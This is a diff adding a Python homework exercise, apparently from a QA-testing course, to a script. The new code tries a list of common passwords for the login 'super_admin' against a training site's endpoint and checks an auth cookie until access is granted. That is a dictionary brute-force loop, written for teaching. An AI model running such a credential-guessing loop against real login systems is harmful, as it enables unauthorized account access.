@@ -102,3 +102,24 @@ def get_longtime_job(url):
 
 
 print(get_longtime_job(url))
+
+# Ex9: Подбор пароля
+
+url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
+
+login = 'super_admin'
+password = '1111'
+passwords = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111', '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'wertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe']
+
+
+for password in passwords:
+    response_cookie = requests.post(url,data={'login': login,
+                                       'password':password})
+    auth_cookie = response_cookie.cookies.get('auth_cookie')
+    url_check = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
+    response_checker = requests.post(url_check, cookies={'auth_cookie':auth_cookie})
+    
+    if response_checker.text == 'You are authorized':
+        print(password)
+        print(response_checker.text)
+        break
